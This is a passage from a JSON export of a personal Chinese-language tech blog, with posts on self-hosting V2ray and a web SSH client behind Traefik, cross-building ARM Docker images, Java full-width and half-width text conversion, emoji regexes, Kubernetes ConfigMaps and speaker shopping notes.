V2ray","url":"%2Fblog%2F2021%2F03%2F28%2F%E5%9C%A8-Raspberry-Pi-%E5%BB%BA%E7%BD%AE-V2ray%2F","content":"\n最近想讓樹莓派做 VPN\n後來有找到這個\n不同VPN使用方法，這個有點像做代理\n後來選這個是因為做 https 可以用 traefik 做更新憑證\n這樣我就可以省一步\n\n<!--more-->\n\n## 前言廢話\n\n[GitHub - alphacodinghub/v2ray-nginx-docker: Easy Docker deployment for V2ray + WS +TLS with Nginx, free SSL and Traefik](https://github.com/alphacodinghub/v2ray-nginx-docker)\n這邊有實例出來\n但我在 build 出錯了...\n\n查看實做一個V2ray 跑\n[Docker 部署 V2Ray · V2Ray 配置指南|V2Ray 白话文教程](https://toutyrater.github.io/app/docker-deploy-v2ray.html)\n好像沒什麼難度\n不如自己試試看\n\n\n意外這個在 Raspberry PI 也能跑\n如果我猜的沒錯，這個掛在 Traefik 應該也能跑\n\n```\ndocker run v2fly/v2fly-core\n```\n\n## 設定實做\n\n參考設定:[WebSocket+TLS+Web · V2Ray 配置指南|V2Ray 白话文教程](https://toutyrater.github.io/advanced/wss_and_web.html)\n\n建立 config.conf\n```json\n{\n  \"inbounds\": [\n    {\n      \"port\": 10000,\n      \"listen\":\"0.0.0.0\",//這邊原本是127.0.0.1，因為要讓traefik 做反向代理，所以設為0.0.0.0\n      \"protocol\": \"vmess\",\n      \"settings\": {\n        \"clients\": [\n          {\n            \"id\": \"b831381d-6324-4e53-ad4f-8cda48b30811\", //建議更換 \n            \"alterId\": 64\n          }\n        ]\n      },\n      \"streamSettings\": {\n        \"network\": \"ws\",\n        \"wsSettings\": {\n        \"path\": \"/ray\"\n        }\n      }\n    }\n  ],\n  \"outbounds\": [\n    {\n      \"protocol\": \"freedom\",\n      \"settings\": {}\n    }\n  ]\n}\n\n```\n\n\n```bash\n# 這邊可以測試看看能不能跑\n docker run --rm    -v `pwd`/config.json:/etc/v2ray/config.json v2fly/v2fly-core \n```\n\n測試可以跑\n\n我改寫程 docker compose 執行\n\n\n```yml\nversion: \"2\"\n\nservices:\n  v2ray_home:\n    image: v2fly/v2fly-core\n    environment:\n      - TZ=Asia/Taipei\n    expose:\n      - \"10000\"\n    restart: always\n    networks:\n      - traefik_network\n    labels:\n      - \"traefik.http.routers.v2ray-https.rule=Host(`pekachu.xxxxxxxx.org`)\"\n      - \"traefik.http.routers.v2ray-https.tls=true\"\n\nnetworks:\n  traefik_network:\n    external: true\n```\n\n\nclient 設定\n\n```json\n{\n  \"inbounds\": [\n    {\n      \"port\": 1080,\n      \"listen\": \"127.0.0.1\",\n      \"protocol\": \"socks\",\n      \"sniffing\": {\n        \"enabled\": true,\n        \"destOverride\": [\"http\", \"tls\"]\n      },\n      \"settings\": {\n        \"auth\": \"noauth\",\n        \"udp\": false\n      }\n    }\n  ],\n  \"outbounds\": [\n    {\n      \"protocol\": \"vmess\",\n      \"settings\": {\n        \"vnext\": [\n          {\n            \"address\": \"pekachu.xxxxxxxx.org\",\n            \"port\": 443,\n            \"users\": [\n              {\n                \"id\": \"b831381d-6324-4e53-ad4f-8cda48b30811\", // 這邊id 需要跟 server 一樣，就等於是密碼\n                \"alterId\": 64\n              }\n            ]\n          }\n        ]\n      },\n      \"streamSettings\": {\n        \"network\": \"ws\",\n        \"security\": \"tls\",\n        \"wsSettings\": {\n          \"path\": \"/ray\"\n        }\n      }\n    }\n  ]\n}\n```\n\n簡單備註\n1. UUID 可更換用[Online UUID Generator Tool](https://www.uuidgenerator.net/)網站\n2. address 需要放對印網址(DNS)\n\n要連需要設定代理 sockv5 127.0.0.1 port: 10801(看v2ray client port設多少)\n我是使用 v2rayN\n相關設定可以看[跨越長城 V2Ray Client - 夜升筆談](https://blog.yosheng.tw/v2ray-client)\n\n用瀏覽器執行\n\n## 相關文章\n\n[Shadowsocks vs V2Ray vs Trojan 都有什么区别？ - LightyearVPN](https://lightyearvpn.com/zh-TW/blog/shadowsocks-vs-v2ray-vs-trojan-for-gfw)\n\n[V2Ray 記錄 | Flymia 凡事用心之事](https://ppundsh.github.io/posts/e457/)\n裡面還滿多設定的，可以參考參考\n\n[神一样的工具们 · Project V 官方网站](https://www.v2ray.com/awesome/tools.html)\n裡面有線上config 產生器\n\n[v2ray揭秘：速度最快的v2ray客户端 V2RayN V2RayW Clash Qv2ray Mellow （v2ray翻墙速度测试） - YouTube](https://www.youtube.com/watch?v=G2eXQrgq_n8)\nClient 比較\n\n[Clash for Windows配置V2ray教程 - V2ray科技](https://v2raytech.com/clash-for-windows-v2ray-tutorial/)\n設個好像有做系統底層代理...不過我沒測試","tags":["v2ray"],"categories":["VPN"]},{"title":"x86 機器 build arm Docker Image 方法","url":"%2Fblog%2F2021%2F03%2F28%2Fx86-%E6%A9%9F%E5%99%A8-build-arm-Docker-Image-%E6%96%B9%E6%B3%95%2F","content":"\n最近要build arm image\n但是...在Raspberry Pi build 的時間非常久\n在想x86有沒有辦法做到\n結果真得可以\n\n<!--more-->\n\n\n```bash\nsudo apt-get update && sudo apt-get install -y --no-install-recommends qemu-user-static binfmt-support\n```\n\n參考:[【 Solutions 】解決在 x86 環境下無法 Build ARM 的 Docker Image](https://learningsky.io/docker-build-on-ubuntu-x86/)\n\n\n試著build 一個Raspberry Pi image 沒有什麼問題","tags":["docker"],"categories":["Docker"]},{"title":"建置 sshwifty (Web shell) 連線工具","url":"%2Fblog%2F2021%2F03%2F28%2F%E5%BB%BA%E7%BD%AE-sshwifty-Web-shell-%E9%80%A3%E7%B7%9A%E5%B7%A5%E5%85%B7%2F","content":"\n最近有遠端需求\n所以在找類似這個工具\n\n<!--more-->\n\n## sshwifty\n\n參考網路上範例修改成 traefik \n\n```bash\nversion: \"2\"\n\nservices:\n  sshwifty_home:\n    image: niruix/sshwifty\n#    container_name: sshwifty_home\n    environment:\n      - TZ=Asia/Taipei\n    expose:\n      - \"8182\"\n    restart: always\n    networks:\n      - traefik_network\n    labels:\n      #- \"traefik.http.routers.sshwifty.rule=Host(`sshwifty.xxxxxxxx.org`) || PathPrefix(`/sshwifty`)\"\n      - \"traefik.port=8000\"\n      - \"traefik.protocol=http\"\n      - \"traefik.http.routers.sshwifty-https.rule=Host(`sshwifty.xxxxxxxx.org`)\"\n      - \"traefik.http.routers.sshwifty-https.tls=true\"\n      - \"traefik.http.middlewares.sshwifty-auth.basicauth.users=user:(htppaswd encode password)\" # 記得做密碼調整\n      #- \"traefik.http.routers.sshwifty.middlewares=sshwifty-auth@docker\"\n      - \"traefik.http.routers.sshwifty-https.middlewares=sshwifty-auth@docker\"\n\nnetworks:\n  traefik_network:\n    external: true\n```\n\n[分享一个超实用的 Web 版 SSH 工具 Sshwifty - 奇妙的 Linux 世界](https://www.hi-linux.com/posts/2389.html)\n[Sshwifty 一款网页端SSH客户端程序 | reizhi](https://roov.org/2020/10/sshwifty-web-ssh-client/)\n\n## 其他相關 web ssh 工具\n\n\n\n### Web SSH 工具整理\n\n- GateOne\n- Sshwifty\n- wssh\n- shellinabox\n- web-shell\n- qweb\n\n\n[开源web终端ssh解决方案_程序狗的成长之路-CSDN博客](https://blog.csdn.net/shenwansangz/article/details/52711577)\n[【webssh】网页上的SSH终端 - K.Takanashi - 博客园](https://www.cnblogs.com/franknihao/p/8963634.html)\n\n\n\nhttps://gist.github.com/vitoo/8da59382a1565282ed55e78637a6a2f5","tags":["ssh"],"categories":["Linux"]},{"title":"程式半型轉全型方法","url":"%2Fblog%2F2021%2F03%2F08%2F%E7%A8%8B%E5%BC%8F%E5%8D%8A%E5%9E%8B%E8%BD%89%E5%85%A8%E5%9E%8B%E6%96%B9%E6%B3%95%2F","content":"\nKeep Learning...\n\n<!--more-->\n\n```java\npublic class HelloWorld{\n\n     public static void main(String []args){\n        System.out.println(halfWidth2FullWidth(\"Hello World!!!@\"));\n        System.out.println(fullWidth2halfWidth(\"Ｈｅｌｌｏ　Ｗｏｒｌｄ！！！＠\"));\n        System.out.println(halfWidth2FullWidth(\"Hello World!!!@中文測試\"));\n        System.out.println(fullWidth2halfWidth(\"中文測試Ｈｅｌｌｏ　Ｗｏｒｌｄ！！！＠\"));\n     }\n     \n    /**\n * Full-angle string conversion half-corner string\n * 1, half-width characters are starting from 33 to 126 end\n * 2, the full-width character corresponding to the half-width character is from 65281 start to 65374 end\n * 3, the half corner of the space is 32. The corresponding Full-width space is 12288\n * The relationship between Half-width and Full-width is obvious, except that the character offset is 65248 (65281-33 = 65248).\n *\n * @param fullWidthStr Non-empty full-width string\n * @return Half-angle string\n */\npublic static  String halfWidth2FullWidth(String fullWidthStr) {\n    if (null == fullWidthStr || fullWidthStr.length() <= 0) {\n        return \"\";\n    }\n    char[] arr = fullWidthStr.toCharArray();\n    for (int i = 0; i < arr.length; ++i) {\n        int charValue = (int) arr[i];\n        if (charValue >= 33 && charValue <= 126) {\n            arr[i] = (char) (charValue + 65248);\n        } else if (charValue == 32) {\n            arr[i] = (char) 12288;\n        }\n    }\n    return new String(arr);\n}\n\n   private static String fullWidth2halfWidth(String fullWidthStr) {\n        if (null == fullWidthStr || fullWidthStr.length() <= 0) {\n            return \"\";\n        }\n        char[] charArray = fullWidthStr.toCharArray();\n        //對全形字元轉換的char陣列遍歷\n        for (int i = 0; i < charArray.length; i++) {\n            int charIntValue = (int) charArray[i];\n            //如果符合轉換關係,將對應下標之間減掉偏移量65248;如果是空格的話,直接做轉換\n            if (charIntValue >= 65281 && charIntValue <= 65374) {\n                charArray[i] = (char) (charIntValue - 65248);\n            } else if (charIntValue == 12288) {\n                charArray[i] = (char) 32;\n            }\n        }\n        return new String(charArray);\n    }\n}\n```\n\n\n* [javascript-半形字串轉全形 @ 程式設計 - 網頁 :: 隨意窩 Xuite日誌](https://blog.xuite.net/chocopie0226/programer/64402547)\n* [java - How to know half-width or full-width character? - Stack Overflow](https://stackoverflow.com/questions/13559050/how-to-know-half-width-or-full-width-character)\n* [encoding - How to convert from full-width to half-width Japanese characters in Java? - Stack Overflow](https://stackoverflow.com/questions/32303509/how-to-convert-from-full-width-to-half-width-japanese-characters-in-java)","categories":["Java"]},{"title":"編輯器抓取 Emoji 文字方法","url":"%2Fblog%2F2021%2F03%2F08%2F%E7%B7%A8%E8%BC%AF%E5%99%A8%E6%8A%93%E5%8F%96-Emoji%2F","content":"\n最進工作維運上要抓 Emoji 文字\n常常用肉眼去找 表情符號\n後來發現 TW,JP 也有 Emoji \n肉眼不一定抓的到\n所以看一下有沒有 Regex\n真的可以用...後來發現不是每一個 Editor 都可以用\n在這邊整理一下\n\n<!--more-->\n\n\n# 編輯器抓取 Emoji\n\n### Sublime Text \n\n```\n[\\x{1f300}-\\x{1f5ff}\\x{1f900}-\\x{1f9ff}\\x{1f600}-\\x{1f64f}\\x{1f680}-\\x{1f6ff}\\x{2600}-\\x{26ff}\\x{2700}-\\x{27bf}\\x{1f1e6}-\\x{1f1ff}\\x{1f191}-\\x{1f251}\\x{1f004}\\x{1f0cf}\\x{1f170}-\\x{1f171}\\x{1f17e}-\\x{1f17f}\\x{1f18e}\\x{3030}\\x{2b50}\\x{2b55}\\x{2934}-\\x{2935}\\x{2b05}-\\x{2b07}\\x{2b1b}-\\x{2b1c}\\x{3297}\\x{3299}\\x{303d}\\x{00a9}\\x{00ae}\\x{2122}\\x{23f3}\\x{24c2}\\x{23e9}-\\x{23ef}\\x{25b6}\\x{23f8}-\\x{23fa}]\n```\n* [unicode - grep for emojis in linux - Stack Overflow](https://stackoverflow.com/questions/52266347/grep-for-emojis-in-linux)\n\n\n### Visual Studio Code\n\n```\n[\\u{1f300}-\\u{1f5ff}\\u{1f900}-\\u{1f9ff}\\u{1f600}-\\u{1f64f}\\u{1f680}-\\u{1f6ff}\\u{2600}-\\u{26ff}\\u{2700}-\\u{27bf}\\u{1f1e6}-\\u{1f1ff}\\u{1f191}-\\u{1f251}\\u{1f004}\\u{1f0cf}\\u{1f170}-\\u{1f171}\\u{1f17e}-\\u{1f17f}\\u{1f18e}\\u{3030}\\u{2b50}\\u{2b55}\\u{2934}-\\u{2935}\\u{2b05}-\\u{2b07}\\u{2b1b}-\\u{2b1c}\\u{3297}\\u{3299}\\u{303d}\\u{00a9}\\u{00ae}\\u{2122}\\u{23f3}\\u{24c2}\\u{23e9}-\\u{23ef}\\u{25b6}\\u{23f8}-\\u{23fa}\\u{200d}]\n```\n\n### Notepad++\n\n沒有找到方法\n\n以下是用 workaround 方法\n處理這個不建議用這個...\n```\n[©️®️‼️⁉️™️ℹ️↔️↕️↖️↗️↘️↙️↩️↪️⌚️⌛️⌨️⏏️⏩️⏪️⏫️⏬️⏭️⏮️⏯️⏰️⏱️⏲️⏳️⏸️⏹️⏺️Ⓜ️▪️▫️▶️◀️◻️◼️◽️◾️☀️☁️☂️☃️☄️☎️☑️☔️☕️☘️☝️☠️☢️☣️☦️☪️☮️☯️☸️☹️☺️♀️♂️♈️♉️♊️♋️♌️♍️♎️♏️♐️♑️♒️♓️♠️♣️♥️♦️♨️♻️♿️⚒️⚓️⚔️⚕️⚖️⚗️⚙️⚛️⚜️⚠️⚡️⚪️⚫️⚰️⚱️⚽️⚾️⛄️⛅️⛈️⛎️⛏️⛑️⛓️⛔️⛩️⛪️⛰️⛱️⛲️⛳️⛴️⛵️⛷️⛸️⛹️⛺️⛽️✂️✅️✈️✉️✊️✋️✌️✍️✏️✒️✔️✖️✝️✡️✨️✳️✴️❄️❇️❌️❎️❓️❔️❕️❗️❣️❤️➕️➖️➗️➡️➰️➿️⤴️⤵️⬅️⬆️⬇️⬛️⬜️⭐️⭕️〰️〽️㊗️㊙️🀄🃏🅰️🅱️🅾️🅿️🆎🆑🆒🆓🆔🆕🆖🆗🆘🆙🆚🈁🈂️🈚🈯🈲🈳🈴🈵🈶🈷️🈸🈹🈺🉐🉑🌀🌁🌂🌃🌄🌅🌆🌇🌈🌉🌊🌋🌌🌍🌎🌏🌐🌑🌒🌓🌔🌕🌖🌗🌘🌙🌚🌛🌜🌝🌞🌟🌠🌡️🌤️🌥️🌦️🌧️🌨️🌩️🌪️🌫️🌬️🌭🌮🌯🌰🌱🌲🌳🌴🌵🌶️🌷🌸🌹🌺🌻🌼🌽🌾🌿🍀🍁🍂🍃🍄🍅🍆🍇🍈🍉🍊🍋🍌🍍🍎🍏🍐🍑🍒🍓🍔🍕🍖🍗🍘🍙🍚🍛🍜🍝🍞🍟🍠🍡🍢🍣🍤🍥🍦🍧🍨🍩🍪🍫🍬🍭🍮🍯🍰🍱🍲🍳🍴🍵🍶🍷🍸🍹🍺🍻🍼🍽️🍾🍿🎀🎁🎂🎃🎄🎅🎆🎇🎈🎉🎊🎋🎌🎍🎎🎏🎐🎑🎒🎓🎖️🎗️🎙️🎚️🎛️🎞️🎟️🎠🎡🎢🎣🎤🎥🎦🎧🎨🎩🎪🎫🎬🎭🎮🎯🎰🎱🎲🎳🎴🎵🎶🎷🎸🎹🎺🎻🎼🎽🎾🎿🏀🏁🏂🏃🏄🏅🏆🏇🏈🏉🏊🏋️🏌️🏍️🏎️🏏🏐🏑🏒🏓🏔️🏕️🏖️🏗️🏘️🏙️🏚️🏛️🏜️🏝️🏞️🏟️🏠🏡🏢🏣🏤🏥🏦🏧🏨🏩🏪🏫🏬🏭🏮🏯🏰🏳️🏴🏵️🏷️🏸🏹🏺🏻🏼🏽🏾🏿🐀🐁🐂🐃🐄🐅🐆🐇🐈🐉🐊🐋🐌🐍🐎🐏🐐🐑🐒🐓🐔🐕🐖🐗🐘🐙🐚🐛🐜🐝🐞🐟🐠🐡🐢🐣🐤🐥🐦🐧🐨🐩🐪🐫🐬🐭🐮🐯🐰🐱🐲🐳🐴🐵🐶🐷🐸🐹🐺🐻🐼🐽🐾🐿️👀👁️👂👃👄👅👆👇👈👉👊👋👌👍👎👏👐👑👒👓👔👕👖👗👘👙👚👛👜👝👞👟👠👡👢👣👤👥👦👧👨👩👪👫👬👭👮👯👰👱👲👳👴👵👶👷👸👹👺👻👼👽👾👿💀💁💂💃💄💅💆💇💈💉💊💋💌💍💎💏💐💑💒💓💔💕💖💗💘💙💚💛💜💝💞💟💠💡💢💣💤💥💦💧💨💩💪💫💬💭💮💯💰💱💲💳💴💵💶💷💸💹💺💻💼💽💾💿📀📁📂📃📄📅📆📇📈📉📊📋📌📍📎📏📐📑📒📓📔📕📖📗📘📙📚📛📜📝📞📟📠📡📢📣📤📥📦📧📨📩📪📫📬📭📮📯📰📱📲📳📴📵📶📷📸📹📺📻📼📽️📿🔀🔁🔂🔃🔄🔅🔆🔇🔈🔉🔊🔋🔌🔍🔎🔏🔐🔑🔒🔓🔔🔕🔖🔗🔘🔙🔚🔛🔜🔝🔞🔟🔠🔡🔢🔣🔤🔥🔦🔧🔨🔩🔪🔫🔬🔭🔮🔯🔰🔱🔲🔳🔴🔵🔶🔷🔸🔹🔺🔻🔼🔽🕉️🕊️🕋🕌🕍🕎🕐🕑🕒🕓🕔🕕🕖🕗🕘🕙🕚🕛🕜🕝🕞🕟🕠🕡🕢🕣🕤🕥🕦🕧🕯️🕰️🕳️🕴️🕵️🕶️🕷️🕸️🕹️🕺🖇️🖊️🖋️🖌️🖍️🖐️🖕🖖🖤🖥️🖨️🖱️🖲️🖼️🗂️🗃️🗄️🗑️🗒️🗓️🗜️🗝️🗞️🗡️🗣️🗨️🗯️🗳️🗺️🗻🗼🗽🗾🗿😀😁😂😃😄😅😆😇😈😉😊😋😌😍😎😏😐😑😒😓😔😕😖😗😘😙😚😛😜😝😞😟😠😡😢😣😤😥😦😧😨😩😪😫😬😭😮😯😰😱😲😳😴😵😶😷😸😹😺😻😼😽😾😿🙀🙁🙂🙃🙄🙅🙆🙇🙈🙉🙊🙋🙌🙍🙎🙏🚀🚁🚂🚃🚄🚅🚆🚇🚈🚉🚊🚋🚌🚍🚎🚏🚐🚑🚒🚓🚔🚕🚖🚗🚘🚙🚚🚛🚜🚝🚞🚟🚠🚡🚢🚣🚤🚥🚦🚧🚨🚩🚪🚫🚬🚭🚮🚯🚰🚱🚲🚳🚴🚵🚶🚷🚸🚹🚺🚻🚼🚽🚾🚿🛀🛁🛂🛃🛄🛅🛋️🛌🛍️🛎️🛏️🛐🛑🛒🛠️🛡️🛢️🛣️🛤️🛥️🛩️🛫🛬🛰️🛳️🛴🛵🛶🛷🛸🤐🤑🤒🤓🤔🤕🤖🤗🤘🤙🤚🤛🤜🤝🤞🤟🤠🤡🤢🤣🤤🤥🤦🤧🤨🤩🤪🤫🤬🤭🤮🤯🤰🤱🤲🤳🤴🤵🤶🤷🤸🤹🤺🤼🤽🤾🥀🥁🥂🥃🥄🥅🥇🥈🥉🥊🥋🥌🥐🥑🥒🥓🥔🥕🥖🥗🥘🥙🥚🥛🥜🥝🥞🥟🥠🥡🥢🥣🥤🥥🥦🥧🥨🥩🥪🥫🦀🦁🦂🦃🦄🦅🦆🦇🦈🦉🦊🦋🦌🦍🦎🦏🦐🦑🦒🦓🦔🦕🦖🦗🧀🧐🧑🧒🧓🧔🧕🧖🧗🧘🧙🧚🧛🧜🧝🧞🧟🧠🧡🧢🧣🧤🧥🧦]\n```\n\n也不能用...\n\n後來發現是 字串 1232 長度 就可以\n超過就不能查詢","categories":["Linux"]},{"title":"Kubernetes 的 ConfigMap","url":"%2Fblog%2F2021%2F03%2F03%2FKubernetes-%E7%9A%84-ConfigMap%2F","content":"\n\n\n<!--more-->\n\n## 建立 Clusters\n\n```bash\nkubectl create configmap <map-name> <data-source>\n```\n\n```bash\n# Create the local directory\nmkdir -p configure-pod-container/configmap/\n\n# Download the sample files into `configure-pod-container/configmap/` directory\nwget https://kubernetes.io/examples/configmap/game.properties -O configure-pod-container/configmap/game.properties\nwget https://kubernetes.io/examples/configmap/ui.properties -O configure-pod-container/configmap/ui.properties\n\n# Create the configmap\nkubectl create configmap game-config --from-file=configure-pod-container/configmap/\n```\n\n這邊有點有趣，client 端做，nodes 竟然可以吃到抓下來的 properties\n不知道底層原理怎麼做到\n\n```bash\nkubectl get configmaps game-config -o yaml\n```\n\n\n```yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  creationTimestamp: 2016-02-18T18:52:05Z\n  name: game-config\n  namespace: default\n  resourceVersion: \"516\"\n  uid: b4952dc3-d670-11e5-8cd0-68f728db1985\ndata:\n  game.properties: |\n    enemies=aliens\n    lives=3\n    enemies.cheat=true\n    enemies.cheat.level=noGoodRotten\n    secret.code.passphrase=UUDDLRLRBABAS\n    secret.code.allowed=true\n    secret.code.lives=30    \n  ui.properties: |\n    color.good=purple\n    color.bad=yellow\n    allow.textmode=true\n    how.nice.to.look=fairlyNice    \n```\n\n\n### 從檔案建立 ConfigMap\n\n```bash\nkubectl create configmap game-config-2 --from-file=configure-pod-container/configmap/game.properties\n```\n\n```bash\nkubectl describe configmaps game-config-2\n```\n\n```\nName:         game-config-2\nNamespace:    default\nLabels:       <none>\nAnnotations:  <none>\n\nData\n====\ngame.properties:\n----\nenemies=aliens\nlives=3\nenemies.cheat=true\nenemies.cheat.level=noGoodRotten\nsecret.code.passphrase=UUDDLRLRBABAS\nsecret.code.allowed=true\nsecret.code.lives=30\nEvents:  <none>\n```\n\n```bash\n# 同時使用--from-file 載入多個檔案\nkubectl create configmap game-config-2 --from-file=configure-pod-container/configmap/game.properties --from-file=configure-pod-container/configmap/ui.properties\n\n# 查看 ConfigMap 內容\nkubectl describe configmaps game-config-2\n```\n\n\n```\nName:         game-config-2\nNamespace:    default\nLabels:       <none>\nAnnotations:  <none>\n\nData\n====\ngame.properties:\n----\nenemies=aliens\nlives=3\nenemies.cheat=true\nenemies.cheat.level=noGoodRotten\nsecret.code.passphrase=UUDDLRLRBABAS\nsecret.code.allowed=true\nsecret.code.lives=30\nui.properties:\n----\ncolor.good=purple\ncolor.bad=yellow\nallow.textmode=true\nhow.nice.to.look=fairlyNice\n```\n\n\n```bash\n#Download the sample files into `configure-pod-container/configmap/` directory\nwget https://kubernetes.io/examples/configmap/game-env-file.properties -O configure-pod-container/configmap/game-env-file.properties\n\n# The env-file `game-env-file.properties` looks like below\ncat configure-pod-container/configmap/game-env-file.properties\nenemies=aliens\nlives=3\nallowed=\"true\"\n\n# This comment and the empty line above it are ignored\n\n\nkubectl get configmap game-config-env-file -o yaml\n# apiVersion: v1\n# kind: ConfigMap\n# metadata:\n#   creationTimestamp: 2017-12-27T18:36:28Z\n#   name: game-config-env-file\n#   namespace: default\n#   resourceVersion: \"809965\"\n#   uid: d9d1ca5b-eb34-11e7-887b-42010a8002b8\n# data:\n#   allowed: '\"true\"'\n#   enemies: aliens\n#   lives: \"3\"\n```\n\n\n使用多個`--from-env-file` \n\n```bash\n# Download the sample files into `configure-pod-container/configmap/` directory\nwget https://kubernetes.io/examples/configmap/ui-env-file.properties -O configure-pod-container/configmap/ui-env-file.properties\n\n# Create the configmap\nkubectl create configmap config-multi-env-files \\\n        --from-env-file=configure-pod-container/configmap/game-env-file.properties \\\n        --from-env-file=configure-pod-container/configmap/ui-env-file.properties\n\n```\n\n```bash\nkubectl get configmap config-multi-env-files -o yaml\n# apiVersion: v1\n# kind: ConfigMap\n# metadata:\n#   creationTimestamp: 2017-12-27T18:38:34Z\n#   name: config-multi-env-files\n#   namespace: default\n#   resourceVersion: \"810136\"\n#   uid: 252c4572-eb35-11e7-887b-42010a8002b8\n# data:\n#   color: purple\n#   how: fairlyNice\n#   textmode: \"true\"\n\n```\n\n\n```bash\n#kubectl create configmap game-config-3 --from-file=<my-key-name>=<path-to-file>\nkubectl create configmap game-config-3 --from-file=game-special-key=configure-pod-container/configmap/game.properties\n\nkubectl get configmaps game-config-3 -o yaml\n\n# apiVersion: v1\n# kind: ConfigMap\n# metadata:\n#   creationTimestamp: 2016-02-18T18:54:22Z\n#   name: game-config-3\n#   namespace: default\n#   resourceVersion: \"530\"\n#   uid: 05f8da22-d671-11e5-8cd0-68f728db1985\n# data:\n#   game-special-key: |\n#     enemies=aliens\n#     lives=3\n#     enemies.cheat=true\n#     enemies.cheat.level=noGoodRotten\n#     secret.code.passphrase=UUDDLRLRBABAS\n#     secret.code.allowed=true\n#     secret.code.lives=30    \n```\n\n\n\n指令內文 key\n\n```bash\nkubectl create configmap special-config --from-literal=special.how=very --from-literal=special.type=charm\nkubectl get configmaps special-config -o yaml\n# apiVersion: v1\n# kind: ConfigMap\n# metadata:\n#   creationTimestamp: 2016-02-18T19:14:38Z\n#   name: special-config\n#   namespace: default\n#   resourceVersion: \"651\"\n#   uid: dadce046-d673-11e5-8cd0-68f728db1985\n# data:\n#   special.how: very\n#   special.type: charm\n```\n\n\n\n```bash\n# Create a kustomization.yaml file with ConfigMapGenerator\ncat <<EOF >./kustomization.yaml\nconfigMapGenerator:\n- name: game-config-4\n  files:\n  - configure-pod-container/configmap/game.properties\nEOF\n\n\nkubectl apply -k .\n\n\n\nkubectl describe configmaps/game-config-4-m9dm2f92bt\n```\n\n定義 key Mapping 到 檔案\n\n```bash\n# Create a kustomization.yaml file with ConfigMapGenerator\ncat <<EOF >./kustomization.yaml\nconfigMapGenerator:\n- name: game-config-5\n  files:\n  - game-special-key=configure-pod-container/configmap/game.properties\nEOF\n\n\nkubectl apply -k .\n```\n\n\n```\n# Create a kustomization.yaml file with ConfigMapGenerator\ncat <<EOF >./kustomization.yaml\nconfigMapGenerator:\n- name: special-config-2\n  literals:\n  - special.how=very\n  - special.type=charm\nEOF\n\n\nkubectl apply -k .\n```\n\n\n## 在 Pod 使用 ConfigMap\n\n### 使用環境變數\n\n```bash\nkubectl create configmap special-config --from-literal=special.how=very\n\n```\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: dapi-test-pod\nspec:\n  containers:\n    - name: test-container\n      image: k8s.gcr.io/busybox\n      command: [ \"/bin/sh\", \"-c\", \"env\" ]\n      env:\n        # Define the environment variable\n        - name: SPECIAL_LEVEL_KEY\n          valueFrom:\n            configMapKeyRef:\n              # The ConfigMap containing the value you want to assign to SPECIAL_LEVEL_KEY\n              name: special-config\n              # Specify the key associated with the value\n              key: special.how\n  restartPolicy: Never\n```\n\n\n```bash\nkubectl create -f https://kubernetes.io/examples/pods/pod-single-configmap-env-variable.yaml\n```\n\n\n使用多個 ConfigMap\n\n```\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: special-config\n  namespace: default\ndata:\n  special.how: very\n---\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: env-config\n  namespace: default\ndata:\n  log_level: INFO\n\n```\n\n\n```bash\nkubectl create -f https://kubernetes.io/examples/configmap/configmaps.yaml\n```\n\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: dapi-test-pod\nspec:\n  containers:\n    - name: test-container\n      image: k8s.gcr.io/busybox\n      command: [ \"/bin/sh\", \"-c\", \"env\" ]\n      env:\n        - name: SPECIAL_LEVEL_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: special-config\n              key: special.how\n        - name: LOG_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: env-config\n              key: log_level\n  restartPolicy: Never\n\n```\n\n\n```bash\nkubectl create -f https://kubernetes.io/examples/pods/pod-multiple-configmap-env-variable.yaml\n```\n\n\nTODO: https://kubernetes.io/docs/tasks/configure-pod-container/configure-pod-configmap/#define-container-environment-variables-with-data-from-multiple-configmaps","tags":["configmap"],"categories":["Kuberenetes"]},{"title":"買S360DB喇吧與需不需要買 DAC 小記","url":"%2Fblog%2F2021%2F02%2F28%2F%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98%2F","content":"\n最近購買 S360DB 喇叭\n有做一些筆記\n方便以後來查詢\n本內容是我從網路上整理的\n因為我不是專業人士，特別整理網路上資訊\n所以可能會有些錯誤\n\n<!--more-->\n\n## 我使用喇叭經歷\n\n我以前用 N 牌塑膠便宜喇叭...\n\n高中有用過三洋 1000 塊 木質喇叭\n後來 ALTEC VS-4621 買(再特價3000時候買)\n最近幾年看發現原來停產了...\n所以當初5000~6000喇叭都降價\n\n最近 ALTEC VS-4621 喇叭壞掉(左邊衛星喇叭沒聲音)\n找不到哪邊有修理，只能換喇叭\n最近換 S360DB 喇叭\n\n## 喇叭推薦選擇\n\n建議還是看[【心得】0~10萬 個人偏愛喇叭推薦 購買 基礎概念分享~ @電腦應用綜合討論 哈啦板 - 巴哈姆特](https://forum.gamer.com.tw/C.php?page=1&bsn=60030&snA=546968)\n專業又豐富...\n\n我桌子比較大，所以我選擇 S360DB \n雖然放這兩顆還是感覺很大\n不過買的時候，建議看一下重低音是否放得下\n重低音深度還滿大的...\n\n我朋友因為桌子比較小，選 Aego 3 2.1\n\n實體店我是去勝鋒光華喇叭專賣店\n那邊襬的喇叭還算不錯\n老闆還算滿專業\n我朋友挑 Aego 3 2.1 老闆有講這個喇叭缺點電腦關機會有抵躁(老闆自己講的)\n跟網路上講得一樣，線材可以升級還有保固\n\n這邊簡單說一下，我使用 S360DB 感想\n目前剛來的時候， 30%音量就覺得很大聲\n所以怕吵的可能不推薦買這種喇叭\n因為這種喇叭要開大聲比較好\n然後 玩遊戲、看電影我會開 50% 音量(電腦的)\n音樂聽 Hi-RES 音質比較好\n遊戲環繞超讚，看動畫影片聲音分離很開\n是一種不同的感受，聽得很有環繞效果\n\n缺點嗎? 喇叭看不到轉多少音量，其實我以前還滿固定看喇叭旋轉音量\n但現在無法看到，說明書也沒說明，有問客服有無法看的方法\n\n> 1.喇叭聲音的段數是屬於微調性質 因此沒有特別分段\n> 2.看不到調多大\n> \n> 說明：當喇叭連接手機藍芽，這時音量會跟手機連動，也就是只有一個音量控制，不會手機音量開到80%，喇叭音量開到30%的多頭馬車現象。\n\n## 